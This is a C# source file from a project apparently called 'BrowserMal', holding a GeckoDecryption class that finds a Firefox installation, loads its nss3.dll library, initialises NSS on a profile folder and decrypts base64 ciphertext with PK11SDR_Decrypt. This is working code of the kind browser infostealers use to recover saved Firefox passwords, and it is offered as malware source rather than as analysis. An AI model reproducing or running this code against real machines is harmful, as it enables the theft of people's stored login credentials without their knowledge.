using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace BrowserMal.Encryption
{
    public class GeckoDecryption
    {
        private static IntPtr Nss3Lib;
        private static readonly string ROOT = @"Mozilla Firefox";
        private static readonly List<string> PROGRAM_FOLDERS = new List<string>()
        {
            Environment.ExpandEnvironmentVariables("%ProgramW6432%"),
            Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%")
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllFilePath);
        
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        /*[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);*/

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string path);

        private static string FindMozzilaFolder()
        {
            foreach (string folder in PROGRAM_FOLDERS)
            {
                string path = Path.Combine(folder, ROOT);

                if (Directory.Exists(path))
                    return path;
            }

            return string.Empty;
        } 

        public static void Init(string directory)
        {
            string mozillaPath = FindMozzilaFolder();

            if (string.IsNullOrEmpty(mozillaPath))
                return;

            LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            Nss3Lib = LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));

            IntPtr pProc = GetProcAddress(Nss3Lib, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));

            dll(directory);
        }

        public static string Decrypt(string cypherText)
        {
            IntPtr intPtr = IntPtr.Zero;

            try
            {
                byte[] array = Convert.FromBase64String(cypherText);
                intPtr = Marshal.AllocHGlobal(array.Length);
                Marshal.Copy(array, 0, intPtr, array.Length);

                TSECItem tsecitem = default;
                TSECItem tsecitem2 = new TSECItem
                {
                    SECItemType = 0,
                    SECItemData = intPtr,
                    SECItemLen = array.Length
                };

                if (PK11SDR_Decrypt(ref tsecitem2, ref tsecitem, 0) == 0 && tsecitem.SECItemLen != 0)
                {
                    byte[] array2 = new byte[checked(tsecitem.SECItemLen - 1 + 1)];
                    Marshal.Copy(tsecitem.SECItemData, array2, 0, tsecitem.SECItemLen);
                    return Encoding.ASCII.GetString(array2);
                }
            }
            catch (Exception)
            {
                return string.Empty;
            }
            finally
            {
                if (intPtr != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intPtr);
                }
            }
            return string.Empty;
        }

        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr procAddress = GetProcAddress(Nss3Lib, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dllfunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
            return dllfunctionDelegate(ref data, ref result, cx);
        }
    }
}
